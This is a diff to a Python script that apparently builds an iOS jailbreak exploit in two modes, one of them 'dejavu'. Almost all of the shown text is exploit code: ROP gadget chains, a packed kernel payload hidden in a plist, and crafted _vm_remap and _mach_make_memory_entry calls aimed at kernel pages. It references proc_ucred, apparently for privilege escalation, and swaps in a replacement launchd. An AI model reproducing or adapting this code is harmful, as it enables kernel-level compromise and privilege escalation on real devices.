@@ -37,18 +37,17 @@ proc_ucred = dmini.cur.sym('_proc_ucred')
 
 dmini.init(['-c', cachefile])
 
-if mode == 'dejavu':
-    def wrap(num):
-        if (num & 0xf0000000) == 0x30000000:
-            return reloc(3, num, alignment=0x1000)
-        else:
-            return num
-    dmini.cur.wrap = wrap
+def wrap(num):
+    if (num & 0xf0000000) == 0x30000000:
+        return reloc(3, num, alignment=0x1000)
+    else:
+        return num
+dmini.cur.wrap = wrap
 
 ldm, stub, num_before_r0, num_after_r0 = dmini.cur.find_ldms(0x14414114)
 #print hex(ldm), hex(stub), num_before_r0, num_after_r0
 
-kernstuff = ([dontcare] * num_before_r0) + [0xffffffff] + ([dontcare] * num_after_r0) + [popdude, mcrdude]
+kernstuff = ([0] * num_before_r0) + [0xffffffff] + ([0] * num_after_r0) + [popdude, mcrdude]
 kernstuff = struct.pack('I'*len(kernstuff), *kernstuff)
 
 kernstuff += '\0' * ((-len(kernstuff) & 0xfff) + (stub & 0xfff))
@@ -58,13 +57,12 @@ plist = '<array><data>%s</data></array>' % base64.b64encode(kernstuff)
 if mode == 'dejavu':
     init('R4', 'R5', 'PC')
     make_r7_avail()
+    m = pointed('')
+    set_sp_to(pointer(m))
+    heapadd(m)
+    heapadd(fwd('R7'), fwd('PC'))
 else:
-    init('R7', 'PC')
-
-m = pointed('')
-set_sp_to(pointer(m))
-heapadd(m)
-heapadd(fwd('R7'), fwd('PC'))
+    initializer, cmdstuff = init_with_initializer_stub()
 make_avail()
 
 funcall('_abort')
@@ -79,7 +77,7 @@ if mode == 'dejavu':
     store_r0_to(zplistpp)
     mtss_count = 9
 else:
-    mtss_count = 4
+    mtss_count = 5
 
 mtss = []
 for i in xrange(mtss_count):
@@ -103,7 +101,7 @@ if mode == 'dejavu':
     memory_entry, memory_entryp = stackunkpair()
     funcall('_mach_make_memory_entry', None, sizep, 0x1000, 5, memory_entryp, 0); dbg_result()
 
-    funcall('_vm_deallocate', mtss.pop(), 0, 0x2000); dbg_result()
+funcall('_vm_deallocate', mtss.pop(), 0, 0x2000); dbg_result()
 
 funcall('_vm_remap', mtss.pop(), zerop, 0x1000, 1, 0, mtss.pop(), ldm & ~0xfff, 0, protp, protp, 2); dbg_result()
 funcall('_vm_remap', mtss.pop(), thousandp, 0x1000, 1, 0, mtss.pop(), stub & ~0xfff, 0, protp, protp, 2); dbg_result()
@@ -217,5 +215,5 @@ if mode == 'dejavu':
     open('dejavu.txt', 'w').write(pickle.dumps({'parse_callback': parse_callback, 'actual_parse_callback': actual_parse_callback, 'final': final, 'plist': zplist}))
 else:
     funcall('_execl', '/sbin/launchd.real', '/sbin/launchd')
-    final = finalize(0x13000000 - 8)
-    open('two.txt', 'w').write(final)
+    final = finalize(reloc(0, 0))
+    open('two.txt', 'w').write(pickle.dumps({'segment': final, 'cmdstuff': cmdstuff}))
